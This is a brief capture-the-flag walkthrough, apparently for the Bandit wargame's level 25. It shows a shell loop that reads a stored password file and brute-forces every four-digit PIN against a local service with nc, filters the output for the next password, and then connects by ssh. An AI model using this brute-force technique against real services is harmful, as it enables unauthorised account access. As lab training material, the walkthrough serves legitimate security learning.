# Level 25

We first put the input we will feed into ```nc``` into a file using the following script:  
```
for i in {0000..9999}; do
    echo "$(cat /etc/bandit_pass/bandit24) $i" >> /tmp/mybandit25/crunch 2>/dev/null;
done
```  

We then pipe the file into ```nc```  and we filter the results:  

```
cat /tmp/mybandit25/crunch |
nc localhost 30002 |
egrep -v "Wrong|Fail|I am|Correct|Exiting" |
egrep -o "[A-Za-z0-9]{32}"
```  

Finally, we ssh to verify the passkey obtained above.

```ssh -p 2220 bandit25@bandit.labs.overthewire.org```
